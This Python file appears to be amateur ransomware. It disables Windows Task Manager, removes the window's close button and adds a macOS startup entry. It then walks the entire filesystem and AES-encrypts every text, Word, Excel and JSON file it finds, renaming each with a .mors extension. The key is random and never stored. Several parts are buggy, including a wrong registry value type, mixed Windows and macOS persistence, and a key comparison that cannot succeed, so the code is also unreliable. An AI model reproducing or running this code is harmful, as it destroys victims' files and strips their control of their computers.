from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
import os
import re
import winreg
import ctypes
import win32gui

extension = ".mors"
whitelisted_extensions = [".txt", ".docx", ".xlsx", ".json"]
encryption_key = get_random_bytes(16)

#change file extension (add .mors to the end)
def add_extension(filename, additional_extension):
    new_filename = filename + additional_extension
    os.rename(filename, new_filename)

#remove the .mors extension from the file
def remove_extension(filename, additional_extension): 
    base, extension = os.path.splitext(filename)
    if extension == additional_extension:
        new_filename = base
        os.rename(filename, new_filename)
        return new_filename
    else:
        return False

#encrypt using cryptodome
def encrypt_data(data, key): 
    iv = get_random_bytes(AES.block_size)
    cipher = AES.new(key, AES.MODE_CBC, iv)
    data = str(data).encode('utf-8')
    block_size = AES.block_size
    padding_length = block_size - (len(data) % block_size)
    data += bytes([padding_length] * padding_length)
    encrypted_data = cipher.encrypt(data)
    return iv + encrypted_data

#decrypt using cryptodome
def decrypt_data(encrypted_data, key): 
    iv = encrypted_data[:AES.block_size]
    cipher = AES.new(key, AES.MODE_CBC, iv)
    decrypted_data = cipher.decrypt(encrypted_data[AES.block_size:])
    padding_length = decrypted_data[-1]
    decrypted_data = decrypted_data[:-padding_length]
    return decrypted_data

#get data from file then run throught encrypt_data function
def encrypt_file(file_path, key): 
    with open(file_path, "rb") as file:
        data = file.read()
        encrypted_data = encrypt_data(data, key)
        
    with open(file_path, "wb") as encrypted_file:
        encrypted_file.write(encrypted_data)
        
    add_extension(file_path, extension)
    return file_path

#get data from file then run throught decrypt_data function
def decrypt_file(file_path, key): 
    with open(file_path, "rb") as file:
        data = file.read()
        decrypted_data = decrypt_data(data, key)
        
    with open(file_path, "wb") as decrypted_file:
        decrypted_file.write(re.sub(r"^b'(.*?)'$", r"\1", decrypted_data.decode('utf-8')).encode('utf-8'))
        
    remove_extension(file_path, extension)
    
    return file_path

#Disable task manager to avid closing
def disable_task_manager():
    registry_path: str = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
    registry_name: str = "DisableTaskMgr"
    value: int = 1
    try:
        reg_key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, registry_path, 0, winreg.KEY_SET_VALUE)
        winreg.SetValueEx(reg_key, registry_name, 0, winreg.REG_SZ, value)
        winreg.CloseKey(reg_key)
    except WindowsError as e:
        print("There was an error setting the registry key {}".format(e))

#add file to startup (got this on stackoverflow)
def add_to_startup(path):
    plist_content = f'''<?xml version="1.0" encoding="UTF-8"?>
    <plist version="1.0">
    <dict>
        <key>Label</key>
        <string>your.unique.label</string>
        <key>ProgramArguments</key>
        <array>
            <string>{path}</string>
        </array>
        <key>RunAtLoad</key>
        <true/>
    </dict>
    </plist>
    '''

    plist_path = os.path.expanduser("~/Library/LaunchAgents/your.unique.label.plist")
    with open(plist_path, "w") as plist_file:
        plist_file.write(plist_content)

#Gets the tiTle of a window
def get_window_title(window_handle):
    return win32gui.GetWindowText(window_handle)

#Disables the Exit button (makes it really small)
def disable_exit():
    window_handle = win32gui.GetForegroundWindow()
    window_title = get_window_title(window_handle)
    window_handle = ctypes.windll.user32.FindWindowW(None, window_title)
    window_style = ctypes.windll.user32.GetWindowLongW(window_handle, -16)
    new_window_style = window_style & ~0x00080000
    ctypes.windll.user32.SetWindowLongW(window_handle, -16, new_window_style)
    ctypes.windll.user32.SetWindowPos(window_handle, 0, 0, 0, 0, 0, 0x0001 | 0x0002 | 0x0040)

"""
#testing
print(encryption_key)
print(encrypt_file("./test.txt", encryption_key))
input()
print(decrypt_file("./test.txt.mors", encryption_key))
"""

#Disable task manager
disable_task_manager()

#Disable Exit Button
disable_exit()

#Add current window to startup
add_to_startup(os.getcwd())

#loop through every file on the system
for root, dirs, files in os.walk("/"):
    for file in files:
        file_path = os.path.join(root, file)
        file_extension = os.path.splitext(file_path)[1].lower()
        if file_extension in whitelisted_extensions:
            encrypt_file(file_path, encryption_key)

#Check for key
def Input_key():
    os.system("cls")
    key = input("Decryption Key >> ")
    if key == encryption_key:
        for root, dirs, files in os.walk("/"):
            for file in files:
                file_path = os.path.join(root, file)
                file_extension = os.path.splitext(file_path)[1].lower()
                if file_extension in whitelisted_extensions:
                    decrypt_file(file_path, encryption_key)
    else:
        print("Incorrect, Press [ENTER] to retry >> ")
        Input_key()
       
